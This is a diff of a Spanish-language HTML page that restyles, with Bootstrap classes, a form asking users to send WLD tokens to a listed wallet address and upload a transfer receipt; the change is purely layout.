@@ -91,16 +91,23 @@
             <div class="success-text" id="cbu-success"></div>
         </div>
 
-        <div class="input-group">
-            <label>Copia y envía los WLD a esta dirección:</label>
-            <div id="wallet-address">0x772c9ffc982ef49b8b3fe750ee8e15010b4857c3</div>
-            <button onclick="copiarDireccion()">Copiar Dirección</button>
+      <div class="card">
+    <div class="card-body">
+        <div class="input-group mb-3">
+            <label class="form-label">Copia y envía los WLD a esta dirección:</label>
+            <div class="input-group">
+                <input type="text" class="form-control" id="wallet-address" value="0x772c9ffc982ef49b8b3fe750ee8e15010b4857c3" readonly>
+                <button class="btn btn-sm btn-primary" onclick="copiarDireccion()">Copiar</button>
+            </div>
         </div>
+        
+        <div class="mb-3">
+            <label for="comprobante" class="form-label">Sube el comprobante del envío de Worldcoin:</label>
+            <input type="file" class="form-control" id="comprobante">
+        </div>
+    </div>
+</div>
 
-        <div class="input-group">
-            <label for="comprobante">Sube el comprobante del envío de Worldcoin:</label>
-            <input type="file" id="comprobante">
-        </div>
 
         <div class="support-text">
             <p>Soporte: <a href="mailto:WorldcoinAPP@Worldcoin.org">WorldcoinAPP@Worldcoin.org</a></p>
